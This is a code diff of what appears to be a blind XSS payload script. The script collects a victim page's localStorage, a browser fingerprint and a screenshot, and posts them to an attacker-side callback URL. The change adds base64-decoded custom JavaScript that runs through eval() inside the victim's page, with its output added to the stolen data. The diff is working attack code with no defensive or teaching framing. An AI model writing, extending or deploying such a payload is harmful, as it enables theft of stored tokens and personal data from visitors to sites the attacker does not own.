@@ -1,12 +1,15 @@
 import FingerprintJS from "@fingerprintjs/fingerprintjs"
 import html2canvas from "html2canvas"
 
-async function gatherData(exclusions, tags) {
+async function gatherData(exclusions, tags, customJs) {
   let dataToSend = {}
 
   try {
     if (tags.length > 0) {
       dataToSend.tags = tags.join()
+    }
+    if (customJs) {
+      dataToSend.custom_js_output = eval(customJs)
     }
     if (!exclusions.includes("local_storage")) {
       dataToSend.local_storage = JSON.stringify(localStorage)
@@ -60,14 +63,15 @@ function sendData() {
       return scripts[scripts.length - 1]
     })()
 
-  let scriptData = atob(currentScript.getAttribute("data")).split(",")
+  let scriptData = window.atob(currentScript.getAttribute("data")).split(",")
   let scriptUrl = new URL(currentScript.src)
 
   let callbackUrl = `${scriptUrl.origin}/api/x/${scriptData[0]}/${scriptData[1]}`
   let exclusions = scriptData[2].split(";")
   let tags = scriptData[3].split(";")
+  let customJs = window.atob(scriptData[4])
 
-  gatherData(exclusions, tags).then((result) => {
+  gatherData(exclusions, tags, customJs).then((result) => {
     serverCallback(callbackUrl, result)
   })
 }
